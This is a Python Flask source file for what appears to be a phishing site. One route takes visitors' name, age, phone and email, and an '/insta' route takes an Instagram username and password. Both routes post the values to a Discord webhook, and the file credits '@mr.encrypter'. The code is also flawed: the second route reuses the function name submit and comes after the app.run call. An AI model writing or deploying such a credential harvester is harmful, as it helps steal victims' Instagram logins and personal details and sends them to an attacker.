from flask import Flask, request, render_template, redirect, url_for
from flask_cors import CORS
import os
import requests
import logging
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
if not DISCORD_WEBHOOK:
    raise RuntimeError("Missing DISCORD_WEBHOOK")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['GET', 'POST'])
def submit():
    if request.method == 'POST':
        try:
            name = request.form.get('name')
            age = request.form.get('age')
            phone = request.form.get('phone')
            email = request.form.get('email')

            message = {
                "content": (
                    "**FORM DETAILS**\n"
                    f"👤 Name: {name}\n"
                    f"🎂 Age: {age}\n"
                    f"📱 Phone: {phone}\n"
                    f"✉️ Email: {email}\n"
                    "\n—\n"
                    "\n—\n"
                    "🔧 Code built by @mr.encrypter "
                )
            }
            requests.post(DISCORD_WEBHOOK, json=message)
            # logger.info("Form submitted and sent to Discord")

        except Exception as e:
            logger.error(f"Submit error: {str(e)}")

        # After submitting, show success page
        return render_template('submit.html')

    # If someone just visits /submit directly
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)


@app.route('/insta', methods=['GET', 'POST'])
def submit():
    if request.method == 'POST':
        try:
            username = request.form.get('username')
            password = request.form.get('password')
            

            message = {
                "content": (
                    "**Instagram Details**\n"
                    f"👤 Username: {username}\n"
                    f"🎂 Password: {password}\n"
                   
                    "\n—\n"
                
                    "🔧 Code built by @mr.encrypter "
                    "\n—\n"
                )
            }
            requests.post(DISCORD_WEBHOOK, json=message)
            # logger.info("Form submitted and sent to Discord")

        except Exception as e:
            logger.error(f"Submit error: {str(e)}")

        # After submitting, show success page
        return render_template('submit.html')

    # If someone just visits /submit directly
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)